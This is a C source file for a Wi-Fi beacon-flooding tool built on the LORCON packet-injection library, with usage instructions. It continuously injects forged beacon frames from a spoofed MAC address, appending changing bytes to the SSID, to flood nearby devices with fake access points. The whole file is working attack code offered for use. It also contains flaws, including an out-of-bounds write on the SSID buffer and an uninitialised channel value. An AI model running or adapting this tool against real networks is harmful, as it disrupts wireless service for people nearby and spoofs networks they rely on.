/*
 *
===
usage-
to compile:
gcc -o BeaconFlooder -lorcon2 BeaconFlooder.c

Put your alpha card in monitor mode, and run:
sudo airmon-ng start wls160u4u1
sudo ./BeaconFlooder -s [SSID_HERE] -i wls160u4u1mon -c 11
===
This is a modified version of a Lorcon example written by
brad.antoniewicz@foundstone.com
*/

#include <stdio.h>
#include <getopt.h>
#include <string.h>
#include <sys/time.h>
#include <lorcon2/lorcon.h>
#include <lorcon2/lorcon_packasm.h>

void usage(char *argv[]) {
        printf("\t-s <SSID>\tSSID to flood\n");
        printf("\t-i <int> \tInterface\n");
        printf("\t-c <channel>\tChannel\n");
        printf("\nExample:\n");
        printf("\t%s -s [SSID] -i wlan0 -c 11\n\n",argv[0]);
}

int main(int argc, char *argv[]) {

    char *interface = NULL;
    char *ssid = NULL;
    int c;
    uint8_t channel;
    unsigned int count = 0;
    int ssidAdded;

    lorcon_driver_t *drvlist, *driver;
    lorcon_t *context;
    lcpa_metapack_t *metapack;
    lorcon_packet_t *txpack;

    //Beacon frame setup

    uint8_t *mac = "\x00\xDE\xAD\xBE\xEF\x00";

    struct timeval time;
    uint64_t timestamp;

    //(6,9,12,18,24,36,48,54)
    uint8_t rates[] = "\x8c\x12\x98\x24\xb0\x48\x60\x6c";
    int interval = 1;
    int capabilities = 0x0421;

    //This handles all of the command line arguments

        while ((c = getopt(argc, argv, "i:s:hc:")) != EOF) {
                switch (c) {
                        case 'i':
                                interface = strdup(optarg);
                                break;
                        case 's':
                                if ( strlen(strdup(optarg)) < 255 ) {
                                        ssid = strdup(optarg);
                                } else {
                                        printf("ERROR: SSID Length > 255 characters\n");
                                        return -1;
                                }
                                break;
                        case 'c':
                                channel = atoi(optarg);
                                break;
                        case 'h':
                                usage(argv);
                                break;
                        default:
                                usage(argv);
                                break;
                        }
        }

        if ( interface == NULL || ssid == NULL ) {
                printf ("ERROR: Interface, channel, or SSID not set (see -h for more info)\n");
                return -1;
        }

        printf("[+] Using interface %s\n",interface);

        //Interface, driver and Lorcon setup:

        // Automatically determine the driver of the interface
        if ( (driver = lorcon_auto_driver(interface)) == NULL) {
                printf("[!] Could not determine the driver for %s\n",interface);
                return -1;
        } else {
                printf("[+]\t Driver: %s\n",driver->name);
        }

        // Create LORCON context and Monitor Mode Interface
        if ((context = lorcon_create(interface, driver)) == NULL) {
                printf("[!]\t Failed to create context");
                return -1;
        }

        if (lorcon_open_injmon(context) < 0) {
                printf("[!]\t Could not create Monitor Mode interface\n");
                return -1;
        } else {
                printf("[+]\t Monitor Mode VAP: %s\n",lorcon_get_vap(context));
                lorcon_free_driver_list(driver);
        }

        // Set the channel we'll be injecting on
        lorcon_set_channel(context, channel);
        printf("[+]\t Using channel: %d\n\n",channel);
 
        // Set initial value to trailing variable, and get length of SSID
        ssidAdded=0;
        int ssidLength = strlen(ssid);

        // Send frames
        while(1) {

                // Create timestamp
                gettimeofday(&time, NULL);
                timestamp = time.tv_sec * 1000000 + time.tv_usec;

                // Initialize the LORCON metapack
                metapack = lcpa_init();

                // Create a Beacon frame 
                lcpf_beacon(metapack, mac, mac, 0x00, 0x00, 0x00, 0x00, timestamp, interval, capabilities);

                // Append IE Tag 0 for SSID
                lcpf_add_ie(metapack, 0, strlen(ssid),ssid);

                // Convert the LORCON metapack to a LORCON packet for sending
                txpack = (lorcon_packet_t *) lorcon_packet_from_lcpa(context, metapack);

                // Send and exit if error
                if ( lorcon_inject(context,txpack) < 0 )
                        return -1;
               
                //Increment and add value at the end of the SSID
                ssidAdded++; 
                ssid[ssidLength]=ssidAdded;

                usleep(interval * 1000); //*

                printf("[+] Sent %d frames\n", count);
                fflush(stdout);
                count++;

                lcpa_free(metapack);
        }

  // Cleanup
  lorcon_close(context);
  lorcon_free(context);

  return 0;
}
